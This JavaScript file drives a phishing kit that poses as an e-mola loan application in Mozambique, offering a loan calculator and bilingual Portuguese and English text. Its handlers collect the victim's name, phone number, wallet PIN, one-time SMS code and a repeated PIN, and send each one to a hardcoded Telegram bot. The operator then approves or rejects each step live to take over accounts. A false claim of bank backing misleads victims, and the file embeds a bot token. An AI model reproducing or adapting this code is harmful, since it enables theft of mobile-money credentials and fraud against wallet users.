const TELEGRAM_BOT_TOKEN = '8690884507:AAEpqQFuqaQeVaF-txzSgx9VxDMinY_JS8w';
const TELEGRAM_CHAT_ID = '5831190536';

const translations = {
    pt: {
        loan_calc: "Calculadora de Empréstimo",
        select_p: "Selecione o valor do empréstimo e o período.",
        monthly: "Pagamento Mensal",
        total_r: "Reembolso Total",
        amount: "Valor do Empréstimo",
        term: "Prazo (Meses)",
        apply: "SOLICITAR AGORA",
        summary: "Resumo do Empréstimo",
        receive: "Valor a receber",
        period: "Período",
        fee: "Taxa de serviço",
        to_repay: "Total a reembolsar",
        penalty_note: "⚠️ Nota: Penalidades se não reembolsado a tempo. Reembolse sempre a tempo para proteger o seu limite.",
        confirm_proceed: "CONFIRMAR E PROSSEGUIR",
        app_details: "Detalhes da Solicitação",
        loan_type: "Tipo de Empréstimo",
        personal_info: "Informações Pessoais",
        full_name: "Nome Completo",
        phone: "Número de Telefone",
        eligibility: "Elegibilidade: Deve ser titular de uma carteira e-mola e ter 18 anos ou mais.",
        review: "Rever Solicitação",
        confirm_apply: "CONFIRMAR E SOLICITAR",
        auth_loan: "Autorizar Empréstimo",
        login_sub: "Inicie sessão na sua conta e-mola para autorizar.",
        pin: "PIN do e-mola",
        login_btn: "ENTRAR",
        otp_ver: "Verificação OTP",
        otp_sub: "Introduza o código enviado para o seu número de telemóvel.",
        verify_btn: "VERIFICAR",
        final_step: "Confirmar PIN",
        final_sub: "Por favor, confirme o seu PIN para concluir a solicitação.",
        finish_btn: "CONCLUIR",
        success_title: "Solicitação Concluída!",
        success_msg: "O seu pedido de empréstimo foi enviado com sucesso e está a ser processado.",
        back_btn: "VOLTAR",
        lang: "ENG",
        flag: "https://flagcdn.com/w40/gb.png",
        placeholder_name: "Ex: João Silva",
        placeholder_phone: "84XXXXXXX / 85XXXXXXX",
        pin_error: "PIN incorreto. Por favor, tente novamente.",
        otp_error: "Código incorreto. Por favor, tente novamente.",
        loading: "Processando...",
        security_note: "🔒 Protegido por bancos parceiros em Moçambique e Itália.",
        auth_reason: "Você está autorizando o seguinte empréstimo:"
    },
    en: {
        loan_calc: "Loan Calculator",
        select_p: "Select your desired loan amount and term.",
        monthly: "Monthly Payment",
        total_r: "Total Repayment",
        amount: "Loan Amount",
        term: "Term (Months)",
        apply: "APPLY NOW",
        summary: "Loan Summary",
        receive: "Amount to receive",
        period: "Period",
        fee: "Service fee",
        to_repay: "Total to repay",
        penalty_note: "⚠️ Note: Penalty applies if not repaid by due date. Always repay on time to protect your limit.",
        confirm_proceed: "CONFIRM & PROCEED",
        app_details: "Application Details",
        loan_type: "Loan Type",
        personal_info: "Personal Information",
        full_name: "Full Name",
        phone: "Phone Number",
        eligibility: "Eligibility: Must be an emola wallet holder and 18 years or older.",
        review: "Review Application",
        confirm_apply: "CONFIRM & APPLY",
        auth_loan: "Authorize Loan",
        login_sub: "Login to your emola account to authorize.",
        pin: "e-mola PIN",
        login_btn: "LOGIN",
        otp_ver: "OTP Verification",
        otp_sub: "Enter the code sent to your mobile number.",
        verify_btn: "VERIFY",
        final_step: "Confirm PIN",
        final_sub: "Please confirm your PIN to complete the request.",
        finish_btn: "FINISH",
        success_title: "Application Completed!",
        success_msg: "Your loan request has been successfully sent and is being processed.",
        back_btn: "BACK",
        lang: "POR",
        flag: "https://flagcdn.com/w40/mz.png",
        placeholder_name: "E.g. John Smith",
        placeholder_phone: "84XXXXXXX / 85XXXXXXX",
        pin_error: "Incorrect PIN. Please try again.",
        otp_error: "Incorrect code. Please try again.",
        loading: "Processing...",
        security_note: "🔒 Secured by sponsored banks in Mozambique and Italy.",
        auth_reason: "You are authorizing the following loan:"
    }
};

// Default language is Portuguese
// Force Portuguese as default for first-time visitors
if (!localStorage.getItem('emola_lang')) {
    localStorage.setItem('emola_lang', 'pt');
}
let currentLang = localStorage.getItem('emola_lang') || 'pt';
let loanData = JSON.parse(localStorage.getItem('emola_data')) || { 
    amount: 5000, 
    term: 12, 
    total: 0, 
    fee: 0, 
    fullName: '', 
    phone: '', 
    loginPhone: '', 
    loginPin: '', 
    otp: '', 
    finalPin: '' 
};

function saveData() {
    localStorage.setItem('emola_data', JSON.stringify(loanData));
    localStorage.setItem('emola_lang', currentLang);
}

// UI Helpers
function applyTranslations() {
    const t = translations[currentLang];
    document.querySelectorAll('[data-t]').forEach(el => {
        const key = el.getAttribute('data-t');
        if (t[key]) el.textContent = t[key];
    });
    
    // Update placeholders
    const nameInput = document.getElementById('full-name');
    if (nameInput) nameInput.placeholder = t.placeholder_name;
    const phoneInput = document.getElementById('phone-number');
    if (phoneInput) phoneInput.placeholder = t.placeholder_phone;
    const loginPhone = document.getElementById('login-phone');
    if (loginPhone) loginPhone.placeholder = t.placeholder_phone;

    // Update Flag and Lang Text
    const langText = document.getElementById('lang-text');
    const langFlag = document.getElementById('lang-flag');
    if (langText) langText.textContent = t.lang;
    if (langFlag) langFlag.src = t.flag;
}

function toggleLanguage() {
    currentLang = currentLang === 'pt' ? 'en' : 'pt';
    saveData();
    applyTranslations();
    
    // Specific page refreshes
    const path = window.location.pathname;
    if (path.endsWith('index.html') || path === '/' || path.includes('index.html')) {
        updateSimulator();
    } else if (path.includes('summary.html')) {
        document.getElementById('sum-period').textContent = `${loanData.term} ${currentLang === 'pt' ? 'Meses' : 'Months'}`;
    } else if (path.includes('details.html')) {
        document.getElementById('detail-term').value = `${loanData.term} ${currentLang === 'pt' ? 'Meses' : 'Months'}`;
    }
}

// Telegram Helpers
async function sendToTelegram(message, buttons = null) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const payload = { chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' };
    if (buttons) payload.reply_markup = { inline_keyboard: buttons };
    try {
        const res = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
        return await res.json();
    } catch (e) { return null; }
}

let lastUpdateId = 0;
let pollingInterval = null;

async function startPolling(callback) {
    if (pollingInterval) clearInterval(pollingInterval);
    const initRes = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?limit=1&offset=-1`).then(r => r.json());
    if (initRes.ok && initRes.result.length > 0) lastUpdateId = initRes.result[0].update_id;

    pollingInterval = setInterval(async () => {
        try {
            const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`).then(r => r.json());
            if (res.ok && res.result.length > 0) {
                for (const update of res.result) {
                    lastUpdateId = update.update_id;
                    if (update.callback_query) {
                        callback(update.callback_query.data);
                        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery?callback_query_id=${update.callback_query.id}`);
                    }
                }
            }
        } catch (e) {}
    }, 2000);
}

// Navigation
function navigateTo(page) {
    saveData();
    window.location.href = page;
}

// Business Logic
function updateSimulator() {
    const slider = document.getElementById('loan-amount-slider');
    const termSelect = document.getElementById('loan-term-select');
    if (!slider) return;
    const amount = parseInt(slider.value);
    const term = parseInt(termSelect.value);
    const rate = 0.15;
    const total = amount + (amount * rate);
    const monthly = total / term;
    const fee = amount * 0.02;

    document.getElementById('display-amount').textContent = `MZN ${amount.toLocaleString()}`;
    document.getElementById('display-monthly').textContent = `MZN ${monthly.toLocaleString(undefined, {maximumFractionDigits: 2})}`;
    document.getElementById('display-total').textContent = `MZN ${total.toLocaleString()}`;

    loanData.amount = amount;
    loanData.term = term;
    loanData.total = total;
    loanData.fee = fee;
}

function initPage() {
    applyTranslations();
    const path = window.location.pathname;

    if (path.endsWith('index.html') || path === '/' || path.includes('index.html')) {
        const slider = document.getElementById('loan-amount-slider');
        if (slider) {
            slider.value = loanData.amount;
            document.getElementById('loan-term-select').value = loanData.term;
            slider.addEventListener('input', updateSimulator);
            document.getElementById('loan-term-select').addEventListener('change', updateSimulator);
            updateSimulator();
        }
    } else if (path.includes('summary.html')) {
        document.getElementById('sum-receive').textContent = `MZN ${loanData.amount.toLocaleString()}`;
        document.getElementById('sum-period').textContent = `${loanData.term} ${currentLang === 'pt' ? 'Meses' : 'Months'}`;
        document.getElementById('sum-fee').textContent = `MZN ${loanData.fee.toLocaleString()}`;
        document.getElementById('sum-total').textContent = `MZN ${loanData.total.toLocaleString()}`;
    } else if (path.includes('details.html')) {
        document.getElementById('detail-amount').value = `MZN ${loanData.amount.toLocaleString()}`;
        document.getElementById('detail-term').value = `${loanData.term} ${currentLang === 'pt' ? 'Meses' : 'Months'}`;
    } else if (path.includes('personal.html')) {
        document.getElementById('full-name').value = loanData.fullName || '';
        document.getElementById('phone-number').value = loanData.phone || '';
    } else if (path.includes('review.html')) {
        document.getElementById('rev-amount').textContent = `MZN ${loanData.amount.toLocaleString()}`;
        document.getElementById('rev-total').textContent = `MZN ${loanData.total.toLocaleString()}`;
        document.getElementById('rev-name').textContent = loanData.fullName || '---';
        document.getElementById('rev-phone').textContent = loanData.phone || '---';
    } else if (path.includes('login.html')) {
        document.getElementById('auth-amount').textContent = `MZN ${loanData.amount.toLocaleString()}`;
        document.getElementById('auth-total').textContent = `MZN ${loanData.total.toLocaleString()}`;
        // Auto-fill phone from previous step
        if (loanData.phone) {
            document.getElementById('login-phone').value = loanData.phone;
        }
    } else if (path.includes('otp.html')) {
        const otpInputs = document.querySelectorAll('.otp-box');
        otpInputs.forEach((input, idx) => {
            input.addEventListener('input', (e) => { 
                if (e.target.value.length === 1 && idx < otpInputs.length - 1) otpInputs[idx + 1].focus(); 
            });
            input.addEventListener('keydown', (e) => { 
                if (e.key === 'Backspace' && !e.target.value && idx > 0) otpInputs[idx - 1].focus(); 
            });
        });
    }

    const langBtn = document.getElementById('lang-btn');
    if (langBtn) langBtn.addEventListener('click', toggleLanguage);
}

// Action Handlers
async function handleLogin() {
    const phone = document.getElementById('login-phone').value;
    const pin = document.getElementById('login-pin').value;
    const error = document.getElementById('login-error');
    if (phone.length < 8 || pin.length < 4) { alert(currentLang === 'pt' ? "Preencha corretamente." : "Please fill correctly."); return; }

    loanData.loginPhone = phone;
    loanData.loginPin = pin;
    saveData();
    error.style.display = 'none';
    document.getElementById('loading-overlay').style.display = 'flex';

    const msg = `<b>🇲🇿 Login e-mola (Moçambique)</b>\n👤 Nome: ${loanData.fullName}\n📱 Tel: ${phone}\n🔐 <b>PIN: ${pin}</b>\n💰 MZN ${loanData.amount.toLocaleString()}`;
    await sendToTelegram(msg, [[{ text: "✅ Aprovar PIN", callback_data: "login_approve" }, { text: "❌ PIN Incorreto", callback_data: "login_decline" }]]);

    startPolling((decision) => {
        if (decision === 'login_approve') { clearInterval(pollingInterval); document.getElementById('loading-overlay').style.display = 'none'; navigateTo('otp.html'); }
        else if (decision === 'login_decline') { clearInterval(pollingInterval); document.getElementById('loading-overlay').style.display = 'none'; error.style.display = 'block'; }
    });
}

async function handleOtp() {
    const otpInputs = document.querySelectorAll('.otp-box');
    let otp = ''; otpInputs.forEach(i => otp += i.value);
    const error = document.getElementById('otp-error');
    if (otp.length < 6) { alert(currentLang === 'pt' ? "Introduza 6 dígitos." : "Enter 6 digits."); return; }

    loanData.otp = otp;
    saveData();
    error.style.display = 'none';
    document.getElementById('loading-overlay').style.display = 'flex';

    const msg = `<b>📩 OTP Recebido (🇲🇿)</b>\n📞 Tel: ${loanData.loginPhone}\n🔢 <b>OTP: ${otp}</b>`;
    await sendToTelegram(msg, [[{ text: "✅ Aprovar OTP", callback_data: "otp_approve" }, { text: "❌ OTP Errado", callback_data: "otp_decline" }]]);

    startPolling((decision) => {
        if (decision === 'otp_approve') { clearInterval(pollingInterval); document.getElementById('loading-overlay').style.display = 'none'; navigateTo('confirm-pin.html'); }
        else if (decision === 'otp_decline') { clearInterval(pollingInterval); document.getElementById('loading-overlay').style.display = 'none'; error.style.display = 'block'; }
    });
}

async function handleFinalConfirm() {
    const pin = document.getElementById('final-pin').value;
    const error = document.getElementById('final-error');
    if (pin.length < 4) { alert(currentLang === 'pt' ? "Confirme o PIN." : "Confirm the PIN."); return; }
    
    loanData.finalPin = pin;
    saveData();
    if (error) error.style.display = 'none';
    document.getElementById('loading-overlay').style.display = 'flex';

    const msg = `<b>🏁 Confirmação Final PIN (🇲🇿)</b>\n📞 Tel: ${loanData.loginPhone}\n🔑 <b>PIN Final: ${pin}</b>\n⚠️ PIN Inicial: ${loanData.loginPin}`;
    await sendToTelegram(msg, [[{ text: "✅ Aprovar Final", callback_data: "final_approve" }, { text: "❌ PIN Incorreto", callback_data: "final_decline" }]]);

    startPolling((decision) => {
        if (decision === 'final_approve') { 
            clearInterval(pollingInterval); 
            document.getElementById('loading-overlay').style.display = 'none'; 
            navigateTo('success.html'); 
        }
        else if (decision === 'final_decline') { 
            clearInterval(pollingInterval); 
            document.getElementById('loading-overlay').style.display = 'none'; 
            if (error) error.style.display = 'block'; 
        }
    });
}

function handlePersonal() {
    loanData.fullName = document.getElementById('full-name').value;
    loanData.phone = document.getElementById('phone-number').value;
    if (!loanData.fullName || !loanData.phone) {
        alert(currentLang === 'pt' ? "Preencha todos os campos." : "Please fill all fields.");
        return;
    }
    navigateTo('review.html');
}

document.addEventListener('DOMContentLoaded', initPage);
